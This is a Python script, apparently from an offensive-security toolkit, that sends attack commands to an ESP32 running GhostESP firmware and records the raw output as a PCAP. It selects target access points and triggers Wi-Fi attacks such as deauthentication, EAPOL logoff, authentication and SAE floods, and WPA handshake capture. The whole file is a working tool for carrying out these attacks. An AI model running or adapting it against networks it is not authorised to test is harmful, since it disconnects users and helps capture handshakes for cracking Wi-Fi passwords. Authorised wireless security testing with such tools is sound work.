#!/usr/bin/env python3
"""esp32_attack_capture.py — merged GhostESP command + raw-capture tool.

Replaces the two-process split (ghostesp.py MCP server sending commands +
esp32_listener.py separately reading /dev/ttyACM0) that deadlocked on the
board's exclusive-port lock (see ~/devicedb/raw/wifi_recon_session_notes.md
and ~/.hermes-offsec/skills/offsec/ghostesp-operations/references/esp32-capture-flow.md).

Same fix devicedb.py already uses: ONE serial session, in one process,
does the asking AND the reading. No second listener competing for the port.

Extra fix vs. ghostesp.py's own _cmd()/_stream(): this reads and writes RAW
BYTES to the capture file (no UTF-8 decode). A WPA handshake / PCAP stream is
binary; decode(errors="replace") — what ghostesp.py's MCP tools do for
human-readable text output — silently corrupts binary capture data. Command
replies (which ARE text) are decoded separately for display; only the
capture file gets the untouched raw bytes.

Usage:
    python3 esp32_attack_capture.py --select 25 --attack eapol_logoff --wait 20
    python3 esp32_attack_capture.py --attack deauth --wait 15 --out /tmp/capture.pcap
    python3 esp32_attack_capture.py --raw "list -a" --wait 3   # just a command, no attack

Options:
    --port PORT      serial device (default /dev/ttyACM0)
    --baud BAUD      baud rate (default 115200)
    --select IDX     AP index/indices to select first, e.g. "25" or "1,3,5"
    --attack TYPE     deauth | deauthall | handshake | channel_switch |
                      eapol_logoff | probe_flood | bad_msg | auth_flood | sae_flood
    --raw CMD         send an arbitrary raw command instead of/along with --attack
    --wait SECONDS    how long to hold the port open and capture (default 15)
    --out PATH        capture file (default ~/devicedb/raw/esp32_capture.pcap)
"""
import argparse
import os
import sys
import time

import serial  # pyserial

ATTACK_FLAGS = {
    "deauth": "-d", "deauthall": "-d", "handshake": "-hsd",
    "channel_switch": "-c", "eapol_logoff": "-e", "probe_flood": "-p",
    "bad_msg": "-b", "auth_flood": "-a", "sae_flood": "-s",
}


def open_port(port, baud):
    return serial.Serial(port, baud, timeout=1)


def send(ser, cmd):
    """Send one line to the ESP32. No read here — reading is the caller's job,
    so raw capture bytes never pass through a text decode."""
    ser.reset_input_buffer()
    ser.write(cmd.encode() + b"\r")


def drain_text(ser, wait):
    """Read for `wait` seconds and return it decoded as text — for short
    control commands (select/stop) whose replies are just CLI text, not a
    binary capture stream."""
    out = b""
    end = time.time() + wait
    while time.time() < end:
        chunk = ser.read(ser.in_waiting or 1)
        if chunk:
            out += chunk
    return out.decode("utf-8", errors="replace").strip()


def wait_for_file(log_path, min_bytes=1024, timeout=10.0):
    """Blocking poll: return True when file grows past min_bytes, False on timeout."""
    start = time.time()
    while time.time() - start < timeout:
        try:
            size = os.path.getsize(log_path)
            if size >= min_bytes:
                return True
        except FileNotFoundError:
            pass
        time.sleep(0.1)
    return False


def capture_raw(ser, wait, log):
    """Read for `wait` seconds, writing every byte untouched to `log`.
    This is the merged listener half — same loop as the old
    esp32_listener.py, just living in the same process as the command
    sender instead of a second one fighting for the port."""
    total = 0
    end = time.time() + wait
    while time.time() < end:
        chunk = ser.read(ser.in_waiting or 1)
        if chunk:
            log.write(chunk)
            log.flush()
            total += len(chunk)
    return total


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default="/dev/ttyACM0")
    ap.add_argument("--baud", type=int, default=115200)
    ap.add_argument("--select", default=None, help="AP index/indices to select, e.g. '25' or '1,3,5'")
    ap.add_argument("--attack", choices=sorted(ATTACK_FLAGS), default=None)
    ap.add_argument("--raw", default=None, help="arbitrary raw firmware command")
    ap.add_argument("--wait", type=float, default=15.0, help="seconds to hold the port + capture")
    ap.add_argument("--out", default=os.path.expanduser("~/devicedb/raw/esp32_capture.pcap"))
    args = ap.parse_args()

    if not args.attack and not args.raw:
        ap.error("need --attack or --raw (nothing to send)")

    print(f"Opening {args.port} @ {args.baud}...", flush=True)
    ser = open_port(args.port, args.baud)
    time.sleep(1)
    # Drain whatever's sitting in the buffer from before we opened.
    if ser.in_waiting:
        ser.read(ser.in_waiting)

    try:
        if args.select:
            send(ser, f"select -a {args.select}")
            reply = drain_text(ser, 1.5)
            print(f"select -a {args.select} -> {reply or '(no reply)'}", flush=True)

        if args.raw and not args.attack:
            send(ser, args.raw)
            reply = drain_text(ser, args.wait)
            print(f"{args.raw} -> {reply or '(no reply)'}", flush=True)
            return

        cmd = args.raw if args.raw else f"attack {ATTACK_FLAGS[args.attack]}"
        print(f"Sending: {cmd}", flush=True)
        print(f"Capturing raw bytes to {args.out} for {args.wait}s...", flush=True)

        with open(args.out, "wb") as log:
            send(ser, cmd)
            total = capture_raw(ser, args.wait, log)

        print(f"Captured {total} bytes -> {args.out}", flush=True)

        # Stop the attack the same way ghostesp.py does.
        send(ser, "stopdeauth")
        stop_reply = drain_text(ser, 1.0)
        if stop_reply:
            print(f"stopdeauth -> {stop_reply}", flush=True)

        if total < 100:
            print("WARNING: <100 bytes captured — likely missed the capture "
                  "window or nothing was in range (see esp32-capture-flow.md).",
                  file=sys.stderr)

    finally:
        ser.close()


if __name__ == "__main__":
    main()
